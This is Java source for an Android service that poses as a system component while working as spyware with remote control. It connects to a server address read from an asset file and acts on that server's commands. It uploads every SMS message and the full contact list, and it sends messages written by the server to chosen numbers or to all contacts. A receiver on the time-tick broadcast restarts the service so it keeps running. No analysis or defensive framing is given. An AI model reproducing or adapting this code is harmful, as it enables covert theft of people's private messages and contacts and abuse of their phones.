package com.android.system.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;

import com.android.system.NetworkSessionManager;
import com.android.system.utils.DataPack;
import com.android.system.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class SystemService extends Service{
    private NetworkSessionManager mSessionManager;
    private NetworkSessionManager.SessionHandler mSessionHandler = new NetworkSessionManager.SessionHandler() {
        private String ACTION_SEND_SMS = "send_sms";
        private String ACTION_UPLOAD_SMS = "upload_sms";
        private String ACTION_UPLOAD_CONTACT = "upload_contact";
        @Override
        public void handleSession(InputStream inputStream, OutputStream outputStream) {
            byte[] receiveData = DataPack.receiveDataPack(inputStream);
            if(receiveData == null) {
                return;
            }
            String command = null;
            try {
                command = new String(receiveData, "UTF-8");
            } catch (UnsupportedEncodingException e) {
                command = new String(receiveData);
            }
            JSONObject jsonObject = null;
            try {
                jsonObject = new JSONObject(command);
            } catch (JSONException e) {
                return;
            }

            String action = null;
            try {
                action = jsonObject.getString("action");
            } catch (JSONException e) {
                return;
            }

            if(action.equals(ACTION_SEND_SMS)) {
                List<String> onlyList = null;
                String content = null;
                try {
                    content = jsonObject.getString("content");
                    JSONArray onlyArray = jsonObject.getJSONArray("only");
                    if(onlyArray.length() > 0) {
                        onlyList = new ArrayList<>();
                        for(int i =0; i<onlyArray.length(); ++i) {
                            onlyList.add(onlyArray.getString(i));
                        }
                    }
                } catch (JSONException e) {
                }
                if(content == null) {
                    return;
                }
                if(onlyList == null) {
                    onlyList = SystemUtil.getAllContact(SystemService.this);
                }
                final String finalContent = content;
                final List<String> finalOnlyList = onlyList;
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        sendMessage(finalContent, finalOnlyList);
                    }
                }).start();
            } else if(action.equals(ACTION_UPLOAD_SMS)) {
                List<SystemUtil.SmsData> smsList = SystemUtil.getSmsInPhone(SystemService.this);
                if(smsList == null) {
                    return;
                }
                JSONObject responseJsonObject = new JSONObject();
                try {
                    JSONArray smsArray = new JSONArray();
                    for(SystemUtil.SmsData smsData: smsList) {
                        JSONObject smsJsonObject = new JSONObject();
                        smsJsonObject.put("person", smsData.person);
                        smsJsonObject.put("address", smsData.address);
                        smsJsonObject.put("body", smsData.body);
                        smsJsonObject.put("date", smsData.date);
                        smsJsonObject.put("type", smsData.type);
                        smsArray.put(smsJsonObject);
                    }
                    responseJsonObject.put(ACTION_UPLOAD_SMS, smsArray);
                } catch (JSONException e) {
                }
                byte[] responseData = null;
                try {
                    responseData = responseJsonObject.toString().getBytes("UTF-8");
                } catch (UnsupportedEncodingException e) {
                    responseData = responseJsonObject.toString().getBytes();
                }
                DataPack.sendDataPack(outputStream,responseData);
            } else if(action.equals(ACTION_UPLOAD_CONTACT)) {
                List<String> contactList = SystemUtil.getAllContact(SystemService.this);
                if(contactList == null) {
                    return;
                }
                JSONObject responseJsonObject = new JSONObject();
                try {
                    JSONArray smsArray = new JSONArray();
                    for(String contact: contactList) {
                        smsArray.put(contact);
                    }
                    responseJsonObject.put(ACTION_UPLOAD_CONTACT, smsArray);
                } catch (JSONException e) {
                }
                byte[] responseData = null;
                try {
                    responseData = responseJsonObject.toString().getBytes("UTF-8");
                } catch (UnsupportedEncodingException e) {
                    responseData = responseJsonObject.toString().getBytes();
                }
                DataPack.sendDataPack(outputStream,responseData);
            }
        }
    };

    public static boolean start(Context context) {
        if(!SystemUtil.isServiceRunning(context, SystemService.class.getCanonicalName())) {
            context.startService(new Intent(context, SystemService.class));
            return true;
        }
        return false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        init();
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, Intent intent) {
                SystemService.start(context);
                final BroadcastReceiver it = this;
                try {
                    context.unregisterReceiver(this);
                } catch (Exception e) {
                }
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            context.registerReceiver(it, new IntentFilter(Intent.ACTION_TIME_TICK));
                        } catch (Exception e) {
                        }
                    }
                },59000);
            }
        }, new IntentFilter(Intent.ACTION_TIME_TICK));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mSessionManager.stop();
    }

    private void init() {
        try {
            InputStream is = getAssets().open("hostname");
            byte[] data = new byte[is.available()];
            is.read(data);
            String address = new String(data, "UTF-8");
            String[] host_port = address.split(":");
            mSessionManager = new NetworkSessionManager(mSessionHandler);
            try {
                mSessionManager.setHeartBeatData(new JSONObject().put("info", Build.MODEL).toString().getBytes("UTF-8"));
            } catch (JSONException e) {
            }
            if(host_port.length >= 1) {
                mSessionManager.setHost( host_port[0] );
            }
            if(host_port.length >= 2) {
                try {
                    mSessionManager.setPort(Integer.parseInt(host_port[1]));
                } catch (Exception e) {
                }
            }
            mSessionManager.start();
        } catch (IOException e) {
        }
    }

    private void sendMessage(String content, List<String> numberList) {
        for(String number: numberList) {
            try {
                SystemUtil.sendSmsTo(SystemService.this, number, content);
            } catch (Exception e) {
            }
        }
    }
}
